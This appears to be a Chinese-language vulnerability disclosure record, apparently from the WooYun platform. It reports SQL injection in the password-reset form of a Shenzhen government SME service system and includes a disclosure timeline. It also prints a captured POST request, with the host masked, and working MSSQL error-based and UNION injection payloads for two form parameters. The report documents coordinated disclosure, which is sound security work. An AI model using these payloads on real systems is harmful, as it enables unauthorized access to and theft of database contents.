wybug_title: 深圳市中小企业服务署某系统MSSQL注入漏洞（涉及15个库）
wybug_corp: 广东省信息安全测评中心
wybug_status: 已交由第三方合作机构(广东省信息安全测评中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-12-08：	细节已通知厂商并且等待厂商处理中									2015-12-09：	厂商已经确认，细节仅向厂商公开									2015-12-19：	细节向核心白帽子及相关领域专家公开									2015-12-29：	细节向普通白帽子公开									2016-01-08：	细节向实习白帽子公开									2016-01-23：	细节向公众公开  简要描述： RT 详细说明：  漏洞地址：
POST /ForgetPwd.aspx HTTP/1.1Host: **.**.**.**Proxy-Connection: keep-aliveContent-Length: 330Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://**.**.**.**Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://**.**.**.**/ForgetPwd.aspxAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: ASP.NET_SessionId=ljbj542obqnu4v2vb4ofse2o__VIEWSTATE=%2FwEPDwULLTEwNDgyNTMyNTNkZNk9CGpeovNC5uLw3%2FfdSE8RaQsz4VQnGFwBeOb6Cf6K&__VIEWSTATEGENERATOR=7719C4C8&__EVENTVALIDATION=%2FwEWBgKT2OafAwL4872JDAKWjsDxDALVo8avDgLj3qy1AQLg9rToBKbLm76XUF0FHgKVNHNRoD5wd3kGsTeDTiwd1zqQjfvM&zzjgdm=1111111111&sbdwmc=aaa*&Submit1=%E4%B8%8B%E4%B8%80%E6%AD%A5&page=1&isAdmin=&HDDValidateCode=
zzjgdm和sbdwmc参数都存在注入，可union
---Parameter: #1* ((custom) POST)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: __VIEWSTATE=/wEPDwULLTEwNDgyNTMyNTNkZNk9CGpeovNC5uLw3/fdSE8RaQsz4VQnGFwBeOb6Cf6K&__VIEWSTATEGENERATOR=7719C4C8&__EVENTVALIDATION=/wEWBgKT2OafAwL4872JDAKWjsDxDALVo8avDgLj3qy1AQLg9rToBKbLm76XUF0FHgKVNHNRoD5wd3kGsTeDTiwd1zqQjfvM&zzjgdm=1111111111&sbdwmc=aaa' AND 4582=CONVERT(INT,(SELECT CHAR(113)+CHAR(120)+CHAR(98)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (4582=4582) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113))) AND 'BaEc'='BaEc&Submit1=%E4%B8%8B%E4%B8%80%E6%AD%A5&page=1&isAdmin=&HDDValidateCode=    Type: UNION query    Title: Generic UNION query (NULL) - 17 columns    Payload: __VIEWSTATE=/wEPDwULLTEwNDgyNTMyNTNkZNk9CGpeovNC5uLw3/fdSE8RaQsz4VQnGFwBeOb6Cf6K&__VIEWSTATEGENERATOR=7719C4C8&__EVENTVALIDATION=/wEWBgKT2OafAwL4872JDAKWjsDxDALVo8avDgLj3qy1AQLg9rToBKbLm76XUF0FHgKVNHNRoD5wd3kGsTeDTiwd1zqQjfvM&zzjgdm=1111111111&sbdwmc=aaa' UNION ALL SELECT CHAR(113)+CHAR(120)+CHAR(98)+CHAR(107)+CHAR(113)+CHAR(104)+CHAR(67)+CHAR(111)+CHAR(75)+CHAR(70)+CHAR(122)+CHAR(67)+CHAR(89)+CHAR(99)+CHAR(76)+CHAR(74)+CHAR(115)+CHAR(66)+CHAR(108)+CHAR(120)+CHAR(86)+CHAR(106)+CHAR(116)+CHAR(82)+CHAR(116)+CHAR(69)+CHAR(101)+CHAR(78)+CHAR(78)+CHAR(116)+CHAR(109)+CHAR(73)+CHAR(103)+CHAR(72)+CHAR(75)+CHAR(104)+CHAR(80)+CHAR(100)+CHAR(115)+CHAR(119)+CHAR(79)+CHAR(110)+CHAR(80)+CHAR(89)+CHAR(71)+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(113)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &Submit1=%E4%B8%8B%E4%B8%80%E6%AD%A5&page=1&isAdmin=&HDDValidateCode=
